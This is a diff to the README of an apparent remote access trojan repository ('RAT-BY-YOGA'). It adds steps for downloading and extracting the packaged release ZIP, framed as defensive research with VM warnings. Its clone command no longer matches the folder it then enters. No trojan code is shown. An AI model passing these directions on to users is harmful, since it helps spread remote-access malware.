@@ -77,9 +77,21 @@ yogarat/
 
 ## 📦 Releases / Download (Defensive Use Only)
 
-Check the [Releases](../../releases) section to download packaged versions intended **only for defensive analysis and research**.
+Check the [Releases](https://github.com/yoga0061/RAT-BY-YOGA/releases) section to download packaged versions intended **only for defensive analysis and research**.
 
 > 🚫 Do **not** install or run any downloaded binaries on personal or production devices.
+
+### 📥 How to Download the ZIP to Your Desktop
+
+1. Go to the [Releases](https://github.com/yoga0061/RAT-BY-YOGA/releases) page of this repository
+2. Click on the **latest release**
+3. Scroll down to the **Assets** section
+4. Click the `.zip` file — it will automatically download to your **Downloads** folder
+5. Move or save it to your **Desktop** if needed
+6. **Extract the ZIP** using WinRAR, 7-Zip, or your OS built-in extractor
+7. Open the extracted folder and **review all contents carefully** before doing anything
+
+> ⚠️ **Always extract and run files inside an isolated VM — never on your host machine, personal device, or any production system.**
 
 ---
 
@@ -87,7 +99,7 @@ Check the [Releases](../../releases) section to download packaged versions inten
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/yoga0061/yogarat.git
+git clone https://github.com/yoga0061/RAT-BY-YOGA.git
 cd yogarat
 
 # 2. Install dependencies
